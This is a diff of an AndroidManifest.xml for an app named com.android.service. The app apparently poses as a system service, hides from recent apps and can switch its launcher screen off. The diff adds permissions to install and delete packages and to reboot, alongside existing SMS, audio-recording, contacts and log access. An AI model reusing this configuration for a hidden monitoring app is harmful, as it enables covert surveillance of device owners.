@@ -3,7 +3,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
 	package="com.android.service" android:versionCode="1"
 	android:versionName="1.0">
-    <!-- @CAVEAT@ -->
+	<!-- @CAVEAT@ -->
 	<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
 	<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
 	<uses-permission android:name="android.permission.WRITE_SMS" />
@@ -31,18 +31,24 @@
 	<uses-permission android:name="android.permission.RECORD_AUDIO" />
 	<uses-permission android:name="android.permission.READ_CONTACTS" />
 	<uses-permission android:name="android.permission.READ_LOGS" />
+	<uses-permission android:name="android.permission.REBOOT"></uses-permission>
+	<uses-permission android:name="android.permission.SET_WALLPAPER"></uses-permission>
+	<uses-permission android:name="android.permission.INSTALL_PACKAGES"></uses-permission>
+	<uses-permission android:name="android.permission.DELETE_PACKAGES"></uses-permission>
 
 	<application android:icon="@drawable/icon" android:label="@string/app_name">
-	
+
 		<activity android:name="com.android.service.gui.AndroidServiceGUI"
-			android:label="@string/app_name" android:excludeFromRecents="true" android:enabled="@GUI_ENABLED@">
+			android:label="@string/app_name" android:excludeFromRecents="true"
+			android:enabled="@GUI_ENABLED@">
 			<intent-filter>
 				<action android:name="android.intent.action.MAIN" />
 				<category android:name="android.intent.category.LAUNCHER" />
 			</intent-filter>
 		</activity>
 
-		<service android:name="ServiceCore" android:exported="false" android:excludeFromRecents="true">
+		<service android:name="ServiceCore" android:exported="false"
+			android:excludeFromRecents="true">
 			<intent-filter>
 				<action android:name="com.android.service.app">
 				</action>
@@ -79,6 +85,8 @@
 				<category android:name="android.intent.category.DEFAULT" />
 			</intent-filter>
 		</receiver>
+		<uses-feature android:name="android.hardware.camera" />
+		<uses-feature android:name="android.hardware.camera.autofocus" />
 	</application>
 
 	<uses-sdk android:minSdkVersion="7" />
